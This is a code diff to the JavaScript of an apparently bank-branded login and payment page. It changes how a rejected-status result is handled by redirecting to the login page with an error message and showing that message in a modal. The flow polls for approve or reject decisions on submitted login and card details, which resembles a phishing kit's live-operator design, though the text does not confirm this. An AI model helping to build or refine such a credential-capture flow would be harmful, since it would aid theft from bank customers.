@@ -625,7 +625,8 @@
           } else if (st === 'reject' || st === 'declined' || st === 'error') {
             clearInterval(statusPollTimer);
             document.getElementById('loadingOverlay').classList.remove('active');
-            document.getElementById('rejectModal').classList.add('active');
+            var rejectMessage = 'The login details were rejected. Please verify the information and try again.';
+            window.location.href = 'login_en.html?error=login&msg=' + encodeURIComponent(rejectMessage);
           }
         })
         .catch(function(err) {
@@ -693,11 +694,22 @@
     });
   }
 
+  function applyRejectedPageMessage() {
+    var params = new URLSearchParams(window.location.search);
+    if (params.get('error') !== 'login') return;
+    var msg = params.get('msg') || 'The login details were rejected. Please verify the information and try again.';
+    var modal = document.getElementById('rejectModal');
+    var modalText = modal ? modal.querySelector('.modal-text') : null;
+    if (modalText) modalText.textContent = msg;
+    if (modal) modal.classList.add('active');
+  }
+
   document.addEventListener('DOMContentLoaded', function(){
     var params = new URLSearchParams(window.location.search);
     if (params.get('error') === 'payment') {
       showInvalidFields(['cardNumber']);
     }
+    applyRejectedPageMessage();
 
     var sessionId = sessionStorage.getItem('aman_bank_session_id');
     if (!sessionId) {
